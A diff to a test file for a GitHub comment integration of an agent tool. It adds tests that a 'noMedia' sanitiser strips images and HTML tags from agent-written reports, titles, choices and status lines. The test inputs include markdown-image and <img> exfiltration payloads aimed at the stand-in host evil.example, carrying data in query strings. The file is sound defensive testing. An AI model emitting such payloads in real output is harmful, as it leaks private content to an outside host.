@@ -21,7 +21,7 @@ isolateAgentConfigs();
 
 const { startServer } = await import('../server/index.js');
 const { RateLimit, STALE_S } = await import('../server/channels/policy.js');
-const { MARKER, backoffMs, hideNames, parseRepo, wispCommand } = await import('../server/channels/github.js');
+const { MARKER, backoffMs, hideNames, noMedia, parseRepo, wispCommand } = await import('../server/channels/github.js');
 
 const ME = { id: 7, login: 'mokh' };
 const PRIVATE = 'acme/repo';
@@ -476,7 +476,7 @@ test('a tool approval is never answered from a comment, and says so', async () =
   await nextOn(n);
 });
 
-async function reported(r, n, summary, title = 'A title') {
+async function reported(r, n, summary, title = 'A title', extra = []) {
   comment(n, '/wisp report something', { in: r });
   await nextOn(n, r);
   const s = await startedOn(n, r);
@@ -484,7 +484,7 @@ async function reported(r, n, summary, title = 'A title') {
   await nextOn(n, r);
   const live = srv.store.get(s.id);
   live.title = title;
-  live.turns.at(-1).presentation = { blocks: [{ type: 'hero', status: 'done', title: 'Agent’s title', summary }] };
+  live.turns.at(-1).presentation = { blocks: [{ type: 'hero', status: 'done', title: 'Agent’s title', summary }, ...extra] };
   await srv.remote.notify(live, { project: 'p' });
   return nextOn(n, r);
 }
@@ -505,6 +505,28 @@ test('what leaves: a secret is taken out, and no mention works', async () => {
   const big = await reported(PRIVATE, long, 'x'.repeat(20000));
   assert.ok(big.length <= 8000, String(big.length));
   assert.ok(big.endsWith(MARKER));
+});
+
+test('nothing an agent wrote renders as an image or a tag: text, title and choices, private or not', async () => {
+  const n = nextIssue();
+  const body = await reported(
+    PRIVATE,
+    n,
+    'Look ![a](https://evil.example/?d=one) and ![b][ref] and <img src=https://evil.example/two> <IFRAME src=x></iframe> <style>a{}</style>\n[ref]: https://evil.example/three\n\n[a link](https://ok.example)',
+    'Title ![t](https://evil.example/?d=title)',
+    [{ type: 'question', question: 'Which?', options: ['![o](https://evil.example/?d=choice)', 'plain'] }],
+  );
+  const text = body.replace(MARKER, '');
+  assert.doesNotMatch(text, /!\[/, 'no image, in the text, the title or a choice');
+  assert.doesNotMatch(text, /<\/?(img|iframe|style)/i, 'no tag');
+  assert.match(text, /\[a link\]\(https:\/\/ok\.example\)/, 'a plain link stays');
+  assert.ok(body.endsWith(`\n\n${MARKER}`), 'and the marker is whole');
+
+  // What else can quote an agent: a title in status.
+  const s = await startedOn(n);
+  srv.store.get(s.id).title = '<img src=https://evil.example/status>';
+  comment(n, '/wisp status');
+  assert.doesNotMatch(await nextOn(n), /<img/);
 });
 
 test('a public repo: a fixed line with nothing an agent wrote, in every path', async () => {
@@ -778,7 +800,9 @@ test('telemetry: counts only, never what was said', async () => {
   } finally {
     srv.telemetry.track = real;
   }
-  assert.deepEqual(seen.map((p) => [p.kind, p.detail]), [['start', 'plain'], ['report', 'full']]);
+  // A report from an earlier test can land in the window: what counts is what was sent.
+  assert.deepEqual(seen.filter((p) => p.kind !== 'report').map((p) => [p.kind, p.detail]), [['start', 'plain']]);
+  assert.ok(seen.some((p) => p.kind === 'report' && p.detail === 'full'));
   assert.ok(!JSON.stringify(seen).includes('secret plan'));
 });
 
@@ -804,6 +828,14 @@ test('hideNames: what you typed stays, and a name inside a longer word isn’t o
   assert.equal(hideNames('api · on laptop', ctx, ''), '…');
   assert.equal(hideNames('in /home/me/api, or rapid', ctx, ''), 'in …, or rapid');
   assert.equal(hideNames('Ada on laptop', ctx, 'on laptop @ada'), 'Ada on laptop');
+});
+
+test('noMedia: images and tags go, what reads as text stays', () => {
+  assert.equal(noMedia('![a](u)'), '!\u200b[a](u)');
+  assert.equal(noMedia('[![a](u)](v)'), '[!\u200b[a](u)](v)');
+  assert.equal(noMedia('<img src=x>'), '<\u200bimg src=x>');
+  assert.equal(noMedia('</style>'), '<\u200b/style>');
+  assert.equal(noMedia('wow! [a](u) and 1 < 2'), 'wow! [a](u) and 1 < 2');
 });
 
 test('parseRepo: github.com origins and nothing else', () => {
